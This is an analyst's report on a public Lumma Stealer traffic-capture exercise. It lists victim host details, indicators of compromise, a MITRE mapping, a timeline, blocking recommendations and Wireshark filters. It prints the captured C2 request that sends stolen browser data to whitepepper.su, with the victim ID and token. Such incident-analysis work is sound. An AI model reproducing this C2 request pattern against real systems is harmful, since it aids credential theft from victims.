# Network Traffic Analysis Report
## Malware Traffic Analysis — 2026-01-31 Exercise

**Analyst:** Mik TINIGO  
**Date:** 2026-05-03 
**PCAP Source:** malware-traffic-analysis.net (2026-01-31)  
**Tools Used:** Wireshark, tshark  
**Classification:** TLP:WHITE (exercise)


---

## 1. Environment Identification

| Field              | Value                         |
|--------------------|-------------------------------|
| Victim IP          | 10.1.21.58                    |
| Gateway / DNS      | 10.1.21.2                     |
| MAC Address        | 00:21:5d:c8:0e:f2             |
| Hostname           | DESKTOP-ES9F3ML               |
| User account       | gwyatt                        |
| User Full Name     | Gabriel Wyatt                 |
| Active Directory   | WIN11OFFICE (WIN-LU4L24X3UB7) |
| Capture Start      | 2026-01-27 23:04:03 UTC       |
| Capture End        | 2026-01-27 23:14:27 UTC       |
| Duration           | 10 minutes 24 seconds         |
| Total Packets      | 51,181                        |

---
## 2. Suspicious Activity Identified

### 2.1 Lumma Stealer - C2 Data transfer - S1213 MITRE ATT&CK
**What it is:** Lumma Stealer is an infostealer malware as a service program developed for Microsoft Windows.
It's distributed by affiliates via a number of campaigns including phishing emails, malicious advertisements 
posing as legitimate downloads, and compromised websites.

**How it appears in this capture:**
The infected host (10.1.21.58) repeatedly sends HTTP POST requests to
an external IP (153.92.1.49), using whitepepper.su DNS domain.
The destination URL (`/whitepepper.su`) is a known Lumma Stealer C2 pattern.


|| POST http://whitepepper.su/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome&act=log
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
Content-Type: application/x-www-form-urlencoded ||

In this URL , we can see : 
/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C
		&token=842e2802df0f0a06b4ed51f12f4387e761523b
		&description=
		&agent=Chrome
		&act=log
THe id of the victim "3BF67EC05320C5729578BE4C0ADF174C", his autentication token "842e2802df0f0a06b4ed51f12f4387e761523b" and
the target browser "Chrome". That's a Lumma Stealer C2 structure.

**Red flags:**
- Lumma Stealer C2 pattern in the HTTP POST URL
- 1739 related packets with average packet size: 1263 bytes (normal) - data transfer
- `/whitepepper.su` — not a legitimate domain.



### 2.2 SMB Traffic (Possible Lateral Movement)

11,223 packets on port 445 (SMB) between internal hosts.
Combined with 95 LDAP packets, this may indicate Active Directory
enumeration or lateral movement attempts post-compromise.

### 2.3 Malicious Domain Resolution

The victim queried `whooptm.cyou` — a ".cyou" TLD malicious domain who is related with Lumma Stealer malware.
There are also `arch.filemegahab4.sbs`,`communicationfirewall-security.cc`,`holiday-forever.cc` who need to be investiguate.

---

## 3. Indicators of Compromise (IOCs)

| IOC Type      | Value                                                 | Confidence |
|---------------|-------------------------------------------------------|------------|
| IP (C2)       | 153.92.1.49                                           | HIGH       |
| URL           | http://whitepepper.su                                 | HIGH       |
| URL Pattern C2| /api/set_agent?id=[hash]&token=[token]&agent=[browser]| HIGH       |
| Victim ID     | 3BF67EC05320C5729578BE4C0ADF174C                      | HIGH       |
| Domain        | arch.filemegahab4.sbs                                 | HIGH       |
| Domain        | communicationfirewall-security.cc                     | HIGH       |
| Domain        | holiday-forever.cc                		        	| HIGH       |
| Domain        | media.megafilehub4.lat           		      		    | HIGH       |
| Domain        | whooptm.cyou                       			    	| HIGH       |
| Victim IP     | 10.1.21.58                         		    		| HIGH       |		

---

## 4. MITRE ATT&CK Mapping

| Technique ID  | Technique Name                        | Evidence                              |
|---------------|---------------------------------------|---------------------------------------|
| T1041         | Exfiltration over C2 Channel          | exfiltring data over HTTP C2 channel  |
| T1071.001     | Application Layer Protocol: HTTP      | C2 over HTTP POST /whitepepper.su     | 
| T1555.003     | Credentials from Web Browsers         | token parameter on POST query         |
| T1018         | Remote System Discovery (suspected)   | SMB + LDAP enumeration                |

---

## 5. Timeline

| Time (UTC)       | Event                                                                    |
|------------------|--------------------------------------------------------------------------|
| 23:04:03         | Capture begins                                                           |
| 23:05:36         | DNS query → whitepepper.su resolved to 153.92.1.49                       |
| 23:05:39         | First C2 contact over HTTP - GET /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome HTTP/1.1\r\n  | 
| 23:05:40         | Data exfiltration begins — POST /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome&act=log HTTP/1.1\r\n  |  
| 23:05:47         | Second agent registered — agent=Edge (stealer dumps Edge browser data)   |
| Throughout       | SMB/LDAP activity on internal network                                    |

---

## 6. Recommendations

1. **Isolate** host 10.1.21.58 immediately from the network
2. **Block** IP `153.92.1.49` at the perimeter firewall
3. **Block** domain malicious domain (whitepepper.su; whooptm.cyou; arch.filemegahab4.sbs; communicationfirewall-security.cc; holiday-forever.cc; 
 media.megafilehub4.lat ) at the DNS resolver
4. **Add** Suricata/Snort rule detecting URI pattern "/api/set_agent" combined with external destination IP
5. **Investigate** SMB activity — check for lateral movement to other hosts
6. **Audit** how windows client be infected (phishing? drive-by download?)
7. **Hunt** for the same domains across all endpoints in the SIEM

---

## 7. Wireshark Filters Used

**whitepepper.su DNS query**
dns.qry.name contains "whitepepper"
**C2 IP filter**
ip.addr == 153.92.1.49
**SMB traffic**
tcp.port == 445
**whooptm.cyou DNS query**
dns.qry.name contains "whooptm"

---

## References

- [Malware Traffic Analysis Exercise](https://www.malware-traffic-analysis.net/2026/01/31/index.html)
- [MITRE ATT&CK S1213 — Lumma Stealer](https://attack.mitre.org/software/S1213/)
- [Whitepepper domain analysis — VirusTotal](https://www.virustotal.com/gui/domain/whitepepper.su/)




